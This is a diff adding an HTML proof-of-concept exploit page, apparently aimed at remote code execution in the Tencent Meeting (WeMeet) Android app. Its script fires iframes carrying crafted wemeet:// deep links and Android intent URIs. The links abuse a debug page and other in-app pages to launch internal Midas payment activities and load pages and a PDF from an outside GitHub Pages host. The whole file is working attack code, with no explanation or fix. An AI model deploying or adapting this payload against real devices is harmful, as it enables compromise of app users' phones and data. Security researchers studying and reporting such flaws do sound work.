@@ -1,0 +1,29 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P23</h1>
+<script>
+document.title='P23L-START';
+var tb='https://gitwhs.github.io/wm-poc-rce/probe23tb.html';
+var midas='intent:#Intent;component=com.tencent.wemeet.app/com.tencent.midas.jsbridge.APWebJSBridgeActivity;end';
+var midas2='intent:#Intent;component=com.tencent.wemeet.app/com.tencent.midas.jsbridge.APWebJSBridgeActivity;S.key_pure_h5_pay=value_pure_h5_pay;end';
+var proxy='intent:#Intent;component=com.tencent.wemeet.app/com.tencent.midas.proxyactivity.APMidasPayProxyActivity;S.pluginsdk_pluginName=MidasPay;S.pluginsdk_launchActivity=com.tencent.midas.pay.APMidasH5DistributeActivity;end';
+var schemes=[
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(midas),
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(midas2),
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(proxy),
+  'wemeet://page/question_answer?url='+encodeURIComponent(tb),
+  'wemeet://page/chat_file_preview?im_file_path='+encodeURIComponent('https://gitwhs.github.io/wm-poc-rce/probe23.pdf')
+];
+var i=0;
+function fire(){
+  if(i>=schemes.length){ document.title='P23L-DONE-IFRAMES'; return; }
+  var s=schemes[i++];
+  document.title='P23L-IFRAME-'+i;
+  var f=document.createElement('iframe');
+  f.src=s;
+  document.body.appendChild(f);
+  setTimeout(fire, 3500);
+}
+setTimeout(fire, 800);
+</script>
+</body></html>
